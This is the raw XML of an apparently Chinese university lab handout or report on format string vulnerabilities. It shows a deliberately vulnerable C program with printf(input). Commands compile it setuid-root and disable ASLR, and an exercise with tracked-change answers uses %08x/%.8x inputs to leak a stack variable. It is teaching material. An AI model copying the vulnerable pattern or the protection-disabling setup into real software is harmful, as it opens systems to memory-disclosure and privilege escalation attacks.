                    <w:p w14:paraId="323EF63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input[</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>100</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>];</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3477DAB8"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var=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>0x11223344</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="750E96A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/*print out information for experiment purpose*/</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4BB6DF1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"Target address: %x\n"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&amp;var);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4199150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"Data at target address: 0x%x\n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, var);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="28C96732" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="5188A9FA"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"Please enter a string: "</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="02EDBA3C"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fgets</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>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000FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>sizeof</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/>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,stdin);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="750E3E2D"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(input);</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>//The vulnerable place</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3E742EE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"Data at target address: 0x%x\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>,var</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0A38035A"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w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="21E5465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00"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>){</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="73C8961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w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="71325D9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343E8D61" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="5EC29C60" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF5FC6B"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编译与运行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E18423" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="41" w:author="zhao ruizhi" w:date="2023-05-08T14:42:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:noProof/>
          <w:sz w:val="24"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4F22320C" wp14:editId="6DE6DC2F">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1478280</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>369570</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="1835150"/>
                <wp:effectExtent l="4445" t="5080" r="9525" b="13970"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="29" name="文本框 29"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="1835150"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="3B9F78E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-o </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>vul</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> -m32 </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>vul.c</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="6FEE40E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chown</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> root </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>vul</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="223D0250"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chmod</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> 4755 </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>vul</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="198E7E9F"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sysctl</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> -w </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>kernel.randomize_va_space</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>=0</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0A9C5F26" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="2BFAEFED" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="4F22320C" id="文本框 29" o:spid="_x0000_s1033" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:116.4pt;margin-top:29.1pt;width:392.9pt;height:144.5pt;z-index:-2516561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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="3B9F78E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-o </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>vul</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> -m32 </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>vul.c</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="6FEE40E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chown</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> root </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>vul</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="223D0250"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chmod</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> 4755 </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>vul</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="198E7E9F"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sysctl</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> -w </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>kernel.randomize_va_space</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>=0</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0A9C5F26" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="2BFAEFED" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>编译并设置权限，关闭保护措施</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D316A3" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="42" w:author="zhao ruizhi" w:date="2023-05-08T14:42:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C99F182" wp14:editId="48D2DA93">
              <wp:extent cx="5274310" cy="2288540"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="1721127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7125" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId21"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="2288540"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="41184641"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实践题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本步骤作为实验开放性考核的一部分，必须整理进实验报告</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4BF9B0" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="43" w:author="zhao ruizhi" w:date="2023-05-08T14:54:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>请利用格式化字符串漏洞，使用%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>格式规定符输出程序中的v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>变量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB6B91F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="842" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="44" w:author="zhao ruizhi" w:date="2023-05-08T14:42:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="45" w:author="zhao ruizhi" w:date="2023-05-08T14:54:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="6"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="842" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="46" w:author="zhao ruizhi" w:date="2023-05-08T14:54:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>如图示：多打印几个%</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>08x</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>，最终可以在内存中看到</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="47" w:author="zhao ruizhi" w:date="2023-05-08T14:55:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>存放v</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ar</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>变量地址里v</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ar</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>的值：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="58E8881E" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="842" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="48" w:author="zhao ruizhi" w:date="2023-05-08T15:29:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="49" w:author="zhao ruizhi" w:date="2023-05-08T14:54:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C1804C7" wp14:editId="207C3C28">
              <wp:extent cx="5274310" cy="930910"/>
              <wp:effectExtent l="0" t="0" r="2540" b="2540"/>
              <wp:docPr id="987981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81260" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId22"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="930910"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6BBAC707" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="842" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="50" w:author="zhao ruizhi" w:date="2023-05-08T14:42:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="6"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="842" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="51" w:author="zhao ruizhi" w:date="2023-05-08T15:29:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>根据以上的结果可知前面需要</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="52" w:author="zhao ruizhi" w:date="2023-05-08T15:30:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>填</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="53" w:author="zhao ruizhi" w:date="2023-05-08T15:30:00Z">
              <w:rPr>
                <w:rFonts w:cs="Tahoma"/>
                <w:sz w:val="24"/>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>5个%.8x</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>来使</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>v</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>a_list</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>指针指向v</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ar</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>的地址。</w:t>
        </w:r>
